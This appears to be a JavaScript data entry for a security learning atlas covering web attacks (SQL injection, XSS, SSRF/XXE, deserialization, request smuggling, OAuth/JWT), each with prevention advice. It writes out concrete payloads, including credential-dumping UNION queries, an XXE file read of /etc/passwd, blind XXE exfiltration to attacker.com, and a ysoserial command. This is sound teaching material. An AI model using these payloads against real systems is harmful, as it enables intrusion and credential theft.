atlasAdd({
  id: "cyber",
  topics: [
    {
      id: "cyber-web",
      title: "Web application security",
      level: "Intermediate",
      body: [
        "**OWASP Top 10** deeply: SQL injection (UNION, blind, second-order), **XSS** (reflected/stored/DOM, CSP bypass), CSRF, **SSRF** (cloud metadata endpoints), XXE, insecure deserialization (Java gadget chains, ysoserial), and IDOR/broken access control. Plus HTTP request smuggling (CL.TE/TE.CL), OAuth attacks, and **JWT** attacks (`alg:none`, HS256/RS256 confusion).",
        "PortSwigger's Academy is the gold standard - free, lab-driven, written by the Burp team.",
      ],
      subtopics: [
        {
          title: "SQL Injection: UNION, Blind, and Second-Order",
          body: [
            "SQL injection occurs when user-controlled input is concatenated directly into a SQL query string. The classic example: `SELECT * FROM users WHERE username='$input'` - inject `' OR '1'='1` and the WHERE clause becomes always-true, returning all rows. The database sees syntactically valid SQL because the injected string terminates the quote context and adds a condition, all within the same query.",
            "**UNION-based injection** exfiltrates data from other tables by appending a `UNION SELECT` clause. Prerequisite: the injected UNION SELECT must return the same number of columns as the original query, with compatible types. Discovery: inject `' ORDER BY 1--`, `' ORDER BY 2--`, etc. until an error reveals the column count, then `' UNION SELECT NULL, NULL, NULL--` to confirm. Once column count is known: `' UNION SELECT username, password, NULL FROM admin--` dumps credentials.",
            "**Blind SQL injection** gives no direct output - the application's behavior (true vs false response, timing difference) leaks one bit per query. Boolean-based: inject `' AND SUBSTRING(password,1,1)='a'--` and observe whether the page returns normal vs error/empty. Binary search over ASCII values extracts each character in 7 queries. **Time-based blind**: `'; IF(1=1) WAITFOR DELAY '0:0:5'--` (MSSQL) or `' AND SLEEP(5)--` (MySQL) causes a 5-second delay on true conditions, defeating even no-response applications.",
            "**Second-order injection** (stored injection): malicious input is stored 'safely' (properly escaped) in the database, then later retrieved and unsafely used in another query. Example: registering with username `admin'--`; the registration query parameterizes correctly. Later, a password change query does `UPDATE users SET password='$new' WHERE username='$stored_username'` - the stored username is interpolated unescaped, injecting into the UPDATE. The fix isn't input sanitization - it's parameterized queries everywhere, not just on input.",
            "Prevention: **parameterized queries** (prepared statements) unconditionally. The query structure is fixed at compile time; user input is passed as a bound parameter that the database driver serializes separately, making injection structurally impossible. ORM query builders (Django ORM, SQLAlchemy, Hibernate) use parameterized queries internally. Danger zone: string interpolation into `LIKE` clauses, `ORDER BY` column names (parameter binding doesn't apply to column/table identifiers), and dynamic SQL construction in stored procedures.",
          ],
          resources: [
            { label: "SQL Injection - PortSwigger Academy", url: "https://portswigger.net/web-security/sql-injection", type: "course" },
            { label: "sqlmap - automatic SQL injection tool", url: "https://sqlmap.org/", type: "tool" },
          ],
        },
        {
          title: "Cross-Site Scripting: Reflected, Stored, DOM, and CSP Bypass",
          body: [
            "XSS injects client-side scripts into pages viewed by other users. The root cause: user-controlled data rendered as HTML without escaping. **Reflected XSS**: the payload is in the URL (query parameter, path segment); the server reflects it unescaped into the HTML response. It requires the victim to click a crafted link. **Stored XSS**: the payload is persisted (comment field, username, profile bio) and served to every subsequent visitor without escaping - no victim interaction beyond visiting the page. **DOM XSS**: the payload never reaches the server; client-side JavaScript reads `location.hash`, `document.referrer`, or `URLSearchParams` and inserts it into the DOM via `innerHTML`, `eval()`, or `document.write()`.",
            "The impact is the JS execution context of the page: **session hijacking** (`document.cookie` theft sent to attacker's endpoint), **keylogging** (`addEventListener('keypress', ...)`), **DOM manipulation** (phishing form overlay), **CSRF token theft** (reading the CSRF token from the page and performing state-changing actions), and in SPAs that use `localStorage` for auth tokens - direct token theft bypassing `HttpOnly` flags. A stored XSS on an admin panel is often the highest-impact finding possible.",
            "**CSP (Content Security Policy)** is the primary defense: HTTP header `Content-Security-Policy: script-src 'self' https://trusted.cdn.com` whitelists script sources. CSP bypass techniques: (1) **JSONP endpoints** on whitelisted origins - if `https://trusted.cdn.com/jsonp?callback=alert(1)` exists, the CSP allows it; (2) **Angular template injection** - if Angular is loaded from a whitelisted CDN, `{{constructor.constructor('alert(1)')()}}` bypasses CSP via Angular's template engine; (3) **`base-uri` missing** allows `<base href='//attacker.com'>` to hijack relative URLs; (4) **`unsafe-inline`** defeats the purpose entirely.",
            "**`HttpOnly`** prevents JS from reading cookies via `document.cookie` - it does not prevent XSS from performing authenticated requests (the browser still sends cookies automatically). **`SameSite=Strict`** prevents the browser from sending cookies on cross-site requests, defeating the CSRF follow-on from XSS. **`SameSite=Lax`** allows top-level navigation but blocks background fetch/form posts. The interaction: XSS on the same origin bypasses all SameSite restrictions because the attack runs in the same site's origin.",
            "Prevention: context-aware output encoding. In HTML body: HTML entity encode (`<` → `&lt;`). In HTML attribute: HTML attribute encode. In JS string: JS escape. In CSS: CSS encode. In URL: URL percent-encode. Template engines (Django templates, Jinja2, Handlebars) do HTML encoding by default but have explicit unescaped interpolation (`|safe`, `{{{ }}}`, `{% autoescape off %}`) that developers misuse. React JSX's `{}` interpolation is safe; `dangerouslySetInnerHTML` is the escape hatch that must be treated like raw HTML injection.",
          ],
          resources: [
            { label: "Cross-Site Scripting - PortSwigger Academy", url: "https://portswigger.net/web-security/cross-site-scripting", type: "course" },
            { label: "CSP Evaluator (Google)", url: "https://csp-evaluator.withgoogle.com/", type: "tool" },
          ],
        },
        {
          title: "SSRF and XXE",
          body: [
            "**Server-Side Request Forgery (SSRF)** occurs when a server makes HTTP requests to a URL controlled by the attacker. The server's requests originate from the internal network, bypassing perimeter firewalls. The canonical target is the AWS/GCP/Azure **instance metadata service** (IMDS): `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` returns temporary AWS IAM credentials. With those credentials, an attacker can call AWS APIs with the role's permissions - often S3 bucket access or EC2 control.",
            "SSRF bypass techniques for allowlist/blocklist filters: (1) **DNS rebinding** - allowlisted domain resolves to internal IP after the check; (2) **IPv6** - `http://[::1]/` equals `localhost`; (3) **Decimal/hex encoding** - `http://2130706433/` is `127.0.0.1` in decimal; (4) **URL redirects** - if the server follows redirects, point an allowed domain to redirect to an internal IP; (5) **Protocol smuggling** - `gopher://` and `file://` schemes may work where `http://` is blocked; (6) **IMDSv1 vs IMDSv2** - AWS IMDSv2 requires a PUT request first (token-based), but if IMDSv1 is enabled alongside it, `GET 169.254.169.254` still works.",
            "The **Capital One breach (2019)** was SSRF: the attacker exploited a misconfigured WAF (running as EC2) that had SSRF in its request proxying, retrieved IAM credentials from the metadata endpoint, assumed an IAM role with S3 read access, and exfiltrated ~106 million customer records from S3. The root cause was an overly permissive IAM role attached to the WAF EC2 instance.",
            "**XXE (XML External Entity)** injection exploits XML parsers that process entity references. A DOCTYPE declaration can define an external entity: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>`. When the parser processes `&xxe;`, it reads `/etc/passwd` and substitutes the contents - if that value is reflected in the response, the file is exfiltrated. **Blind XXE** exfiltrates via out-of-band channel: the external entity URL is `http://attacker.com/collect?data=` and the file content is appended via a nested entity.",
            "XXE prevention: disable DOCTYPE processing entirely in the XML parser (the default in most modern libraries when configured correctly). In Java, `DocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)`. SSRF prevention: allowlist valid destination URLs rather than blocklisting; use cloud provider IMDSv2 (requires session token); enforce network-level segmentation so the application server can't reach internal services it doesn't need.",
          ],
          resources: [
            { label: "SSRF - PortSwigger Academy", url: "https://portswigger.net/web-security/ssrf", type: "course" },
            { label: "XXE Injection - OWASP", url: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing", type: "docs" },
          ],
        },
        {
          title: "Insecure Deserialization and Java Gadget Chains",
          body: [
            "Serialization converts an object's in-memory state to a byte stream for storage or transmission. Deserialization reconstructs the object from that stream. The vulnerability: if the deserialized class has methods that execute side effects during construction or property access, and if those methods can be chained to reach arbitrary code execution, then an attacker who controls the serialized payload controls execution.",
            "Java's built-in serialization (`ObjectInputStream.readObject()`) is the canonical example. The JVM will instantiate any class on the classpath present in the stream, invoking `readObject()` hooks. **Gadget chains** use classes already present in the application's classpath (Commons Collections, Spring, Hibernate) whose `readObject()`/`hashCode()`/`equals()` methods happen to invoke reflection, ultimately reaching `Runtime.exec()`. **ysoserial** is the tool that generates these payloads: `java -jar ysoserial.jar CommonsCollections1 'id' | base64` produces a Base64 serialized payload that executes `id` on deserialization.",
            "Identifying Java serialization: the magic bytes `AC ED 00 05` (hex) / `rO0AB` (Base64) prefix every Java serialized stream. Check HTTP parameters, cookies (`JSESSIONID`), and upload endpoints for these bytes. The `ViewState` parameter in .NET WebForms is a serialized object signed with a machine key - cracking or leaking the key enables arbitrary deserialization.",
            "PHP's `unserialize()` is similarly dangerous. PHP object injection exploits `__wakeup()` and `__destruct()` magic methods called during deserialization. The **Magento 2.x** RCE (CVE-2019-8118) exploited a PHP gadget chain through `__destruct()`. Python's `pickle` module is arguably worse: `pickle.loads()` of attacker-controlled data calls `__reduce__()` which can return `(os.system, ('id',))` - arbitrary OS command execution with a trivial payload.",
            "Mitigation: avoid deserializing untrusted data entirely. Use data-only formats (JSON with explicit schema validation) for inter-service communication. If Java serialization is unavoidable, use the `serialization filter` mechanism (JDK 9+ `ObjectInputFilter`) to allowlist only expected classes. Monitor for deserialization by instrumenting `ObjectInputStream` - RASP (Runtime Application Self-Protection) products hook this.",
          ],
          resources: [
            { label: "Insecure Deserialization - PortSwigger Academy", url: "https://portswigger.net/web-security/deserialization", type: "course" },
            { label: "ysoserial - Java Deserialization Payloads", url: "https://github.com/frohoff/ysoserial", type: "tool" },
          ],
        },
        {
          title: "HTTP Request Smuggling",
          body: [
            "HTTP request smuggling exploits disagreement between a front-end proxy and a back-end server about where one HTTP request ends and the next begins. HTTP/1.1 supports two ways to specify body length: `Content-Length` (explicit byte count) and `Transfer-Encoding: chunked` (data sent in chunks, terminated by a 0-length chunk). When a proxy uses one and the back-end uses the other, an attacker can 'smuggle' a prefix of a second request inside the body of the first.",
            "**CL.TE** attack: front-end honors `Content-Length`, back-end honors `Transfer-Encoding`. The attacker sends a request with both headers; the proxy forwards the full Content-Length bytes, but the back-end sees the chunked terminator early and considers the request ended - the remaining bytes become the start of the *next* request. **TE.CL** is the reverse. **TE.TE** occurs when both process chunked encoding but one can be desynchronized by an obfuscated header: `Transfer-Encoding: xchunked` or `Transfer-Encoding:\tchunked` (tab before value).",
            "Exploitation: smuggle a partial HTTP request that will be prepended to the next victim's request, redirecting it. Example: smuggle `GET /admin HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\n` - the victim's next GET request to `/home` gets a `127.0.0.1` header injected, bypassing IP-based admin restrictions. More severe: smuggle a request that causes the server to cache a poison response mapped to a URL that victims will subsequently fetch - **web cache poisoning via smuggling**.",
            "The **James Kettle research** (PortSwigger, 2019) showed request smuggling enabling: account takeover (capturing another user's credentials in the smuggled request body), reflected XSS that CSP can't mitigate (the smuggled response bypasses the victim's request headers), and bypassing security controls on front-end proxies. Practically all major web infrastructure was vulnerable.",
            "Detection: Burp Suite's **HTTP Request Smuggler** extension automates detection. Use timing - a successfully smuggled request causes the next legitimate request to receive an unexpected response, detectable with measured timing differentials. Mitigation: use HTTP/2 end-to-end (HTTP/2 has a single unambiguous length framing, eliminating the ambiguity), or configure front-end/back-end to reject requests with both `Content-Length` and `Transfer-Encoding`.",
          ],
          resources: [
            { label: "HTTP Request Smuggling - PortSwigger Research", url: "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn", type: "paper" },
            { label: "HTTP Request Smuggling Labs - PortSwigger", url: "https://portswigger.net/web-security/request-smuggling", type: "course" },
          ],
        },
        {
          title: "OAuth and JWT Attacks",
          body: [
            "**OAuth 2.0** is an authorization delegation framework, not an authentication protocol (that's OpenID Connect on top of it). The Authorization Code flow: user clicks 'Login with Google', is redirected to `accounts.google.com/oauth/auth?client_id=X&redirect_uri=Y&response_type=code&state=Z`, authenticates, and Google redirects back to `Y?code=AUTH_CODE&state=Z`. The application exchanges the auth code for an access token at Google's token endpoint using its client secret.",
            "OAuth attack vectors: (1) **`state` parameter CSRF** - if the state parameter is missing or not validated, an attacker can initiate OAuth and trick a victim into completing it with the attacker's code, linking the victim's account to the attacker's identity; (2) **`redirect_uri` manipulation** - if the server accepts partial URI matches, redirect to `https://client.com.attacker.com` or `https://client.com/callback?redirect=//attacker.com` to steal the auth code; (3) **implicit flow token leakage** - the `response_type=token` flow puts the access token in the URL fragment, which may leak via the `Referer` header or browser history.",
            "**JWT (JSON Web Token)** is a self-contained token: Base64URL(header).Base64URL(payload).signature. The header specifies the algorithm. **`alg:none` attack**: if the server accepts tokens with `\"alg\":\"none\"`, forge a token with no signature - many libraries accepted this. **Algorithm confusion (HS256/RS256)**: the server generates tokens with RSA private key (RS256, asymmetric). An attacker takes the server's RSA public key (often publicly available at `/jwks.json`) and signs a forged token using it as an HMAC secret (HS256, symmetric). If the server naively trusts the `alg` field from the token header, it will verify the HMAC signature using the same public key, and the forged token passes.",
            "**`kid` injection**: the JWT header's `kid` (key id) field selects which key to verify the signature with. If `kid` is used in a database lookup: `kid = 'injected'` → SQL injection. If it's used in a filesystem path: `kid = '../../dev/null'` → verification with an empty key, allowing a token signed with an empty secret to pass. **`jku` / `x5u` SSRF**: these header fields can point to a remote JWKS URL; if the server fetches it, the attacker hosts a crafted JWKS with their own public key.",
            "Mitigation: validate `alg` against an explicit allowlist before verification (never trust the header's `alg`), disable `alg:none` unconditionally, fix `kid` to a static lookup table (not filesystem/DB path), validate `redirect_uri` against an exact allowlist, enforce state parameter. Use battle-tested OAuth libraries and read their security advisories.",
          ],
          resources: [
            { label: "OAuth 2.0 Attacks - PortSwigger Academy", url: "https://portswigger.net/web-security/oauth", type: "course" },
            { label: "JWT Attacks - PortSwigger Academy", url: "https://portswigger.net/web-security/jwt", type: "course" },
          ],
        },
      ],
      resources: [
        { label: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", type: "course" },
        { label: "OWASP Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", type: "docs" },
        { label: "HackTricks Web Pentesting", url: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web", type: "docs" },
      ],
      connections: [
        { to: "crypto-tls", note: "TLS underlies HTTPS; JWT uses same crypto primitives (HMAC, RSA, ECDSA)" },
        { to: "cyber-foundations", note: "HTTP/TLS protocol knowledge required for web attack understanding" },
        { to: "crypto-signatures", note: "JWT signature algorithms (RS256, ES256) are digital signature schemes" },
      ],
    },
  ],
});
